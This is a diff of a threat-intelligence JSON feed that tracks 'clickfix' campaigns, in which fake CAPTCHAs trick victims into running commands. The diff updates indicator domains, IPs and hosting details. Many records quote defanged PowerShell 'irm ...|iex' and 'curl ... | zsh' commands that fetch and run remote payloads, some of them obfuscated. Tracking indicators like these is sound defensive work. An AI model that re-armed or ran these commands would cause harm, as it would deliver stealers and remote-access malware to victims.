@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4990,
+ "count": 4988,
  "indicators": [
   {
    "indicator": "1.234.27.94",
@@ -9261,10 +9261,11 @@
     "cosmical2049.com"
    ],
    "lure_from": [
-    "softify.space",
     "interseq.at",
-    "ncheck-brows.beer",
-    "codes.browse-cdn.beer"
+    "softify.space",
+    "codes.browse-cdn.beer",
+    "softify.lat",
+    "ncheck-brows.beer"
    ]
   },
   {
@@ -9477,9 +9478,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//t-trustresnew[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -13484,61 +13487,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "aheadofthecurvelaw.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-03",
-   "last_online": "2026-11-08",
-   "offline_since": null,
-   "url": "https://aheadofthecurvelaw.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "GoDaddy",
-   "dns": "GoDaddy",
-   "ip": "132.148.178.106",
-   "asn": "AS398101",
-   "org": "GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "132.148.178.106",
-     "asn": "AS398101",
-     "org": "GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "aheadofthecurvelaw.com",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
-   ],
-   "connects_to": [
-    "hagosuro.lc",
-    "xorados.com",
-    "trek-72.com",
-    "trustchecknes.com",
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "ahmaar.com",
@@ -63867,12 +63815,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
@@ -71835,19 +71784,21 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
    "lure_from": [
     "interseq.at",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -89138,7 +89089,10 @@
     "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
-   "lure_from": []
+   "lure_from": [
+    "govrobczxc.cc",
+    "fudcomcheck.art"
+   ]
   },
   {
    "indicator": "facturaporcorreo.com",
@@ -126483,13 +126437,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "groverudder12.com"
@@ -129534,12 +129489,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -131883,12 +131839,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -137468,61 +137425,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "khoddamolhussein.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-08",
-   "offline_since": null,
-   "url": "https://khoddamolhussein.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Network NOAVARAN SHABAKEH SABZ MEHREGAN (Ltd.)",
-   "dns": "hostiran.net",
-   "ip": "213.176.126.166",
-   "asn": "AS59441",
-   "org": "Hostiran-Network NOAVARAN SHABAKEH SABZ MEHREGAN (Ltd.), IR",
-   "country": "IR",
-   "ips": [
-    {
-     "ip": "213.176.126.166",
-     "asn": "AS59441",
-     "org": "Hostiran-Network NOAVARAN SHABAKEH SABZ MEHREGAN (Ltd.), IR",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "khoddamolhussein.com",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
-   ],
-   "connects_to": [
-    "hagosuro.lc",
-    "xorados.com",
-    "trek-72.com",
-    "trustchecknes.com",
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "khuddari.com",
@@ -146032,19 +145934,22 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "lepafonso.bz",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "groverudder12.com"
    ],
    "lure_from": [
     "interseq.at",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -155493,12 +155398,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
@@ -157745,12 +157651,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -162151,12 +162058,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -163306,13 +163214,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "groverudder12.com"
@@ -165339,12 +165248,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -167695,12 +167605,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -169683,10 +169594,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//t-trustresnew[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/Girya/[id]')|iex",
     "(irm 'hxxps[:]//t-trustrest[.]com/Girya/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -169735,12 +169648,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -173960,12 +173874,14 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "lepafonso.bz",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -174928,12 +174844,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
@@ -176396,12 +176313,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -184871,12 +184789,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -185824,12 +185743,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -188366,12 +188286,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -189657,14 +189578,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
    ],
    "connects_to": [
-    "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "copiose.org"
    ],
    "lure_from": [
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
    ]
@@ -194874,6 +194796,7 @@
    "lure_from": [
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
    ]
@@ -198891,12 +198814,13 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -203667,6 +203591,7 @@
    ],
    "lure_from": [
     "interseq.at",
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc",
     "yaebalciganovvjopu.org",
@@ -209208,12 +209133,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
     "t-trustrest.com"
@@ -216542,6 +216468,7 @@
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
     "interseq.at",
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
    ]
@@ -221941,15 +221868,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
    ],
    "connects_to": [
-    "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "copiose.org"
    ],
    "lure_from": [
     "thu-ipad-03.cfd",
+    "yaponovosh.org",
     "mon-blanc-02.cfd",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
@@ -223022,12 +222950,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
    ],
    "connects_to": [
-    "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "copiose.org"
    ],
    "lure_from": [
     "mon-blanc-02.cfd",
@@ -225824,15 +225752,16 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
    ],
    "connects_to": [
-    "copiose.org",
-    "escapeai.live"
+    "escapeai.live",
+    "copiose.org"
    ],
    "lure_from": [
     "mon-blanc-02.cfd",
+    "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
    ]
